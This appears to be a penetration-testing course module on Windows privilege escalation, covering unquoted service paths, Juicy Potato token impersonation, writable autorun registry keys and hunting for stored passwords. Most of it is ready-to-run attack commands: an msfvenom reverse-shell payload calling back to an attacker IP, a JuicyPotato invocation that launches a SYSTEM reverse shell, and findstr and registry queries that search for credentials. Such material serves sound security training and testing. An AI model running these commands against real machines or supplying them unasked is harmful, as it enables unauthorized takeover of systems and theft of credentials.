# Module 14: Windows Privilege Escalation Examples

## 1. Unquoted Service Path Example

**Vulnerability Discovery:**
Find services with unquoted paths using WMIC or PowerShell.
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Output:**
```
Development Service    DevService    C:\Program Files\Enterprise Apps\Current Version\dev-svc.exe    Auto
```

**Exploitation:**
Since `C:\Program Files\Enterprise Apps\Current Version\dev-svc.exe` is unquoted and has spaces, Windows will try to execute:
1. `C:\Program.exe`
2. `C:\Program Files\Enterprise.exe`

If we have write access to `C:\Program Files\`, we can place our malicious executable there.
```cmd
# Create malicious payload using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o Enterprise.exe

# Transfer Enterprise.exe to target and place it in C:\Program Files\
# Restart the service (if permissions allow) or wait for a system reboot
sc stop DevService
sc start DevService
```

## 2. Token Impersonation (Juicy Potato)

When you have `SeImpersonatePrivilege` (often found on service accounts like IIS or SQL).

**Checking Privileges:**
```cmd
whoami /priv
```

**Exploitation:**
Using Juicy Potato to escalate to SYSTEM.
```cmd
# Execute a reverse shell as SYSTEM
JuicyPotato.exe -l 1337 -p c:\temp\reverse_shell.exe -t * -c {F3130C6F-C532-4740-96A7-7C96B76295CE}
```

## 3. Insecure Registry Keys (Autorun)

Check for permissions on applications that start on boot via the registry.
```cmd
# Query Autorun keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
Output:
```
    MyProgram    REG_SZ    C:\Apps\Startup\MyProgram.exe
```

If we have write access to the registry key or `C:\Apps\Startup\`, we can overwrite `MyProgram.exe` or change the registry value to point to our payload.

## 4. Passwords in Configuration Files

Searching for sensitive files:
```cmd
# Search for Unattend.xml
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

# Search registry for saved Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password strings in config files
findstr /si password *.xml *.ini *.txt
```
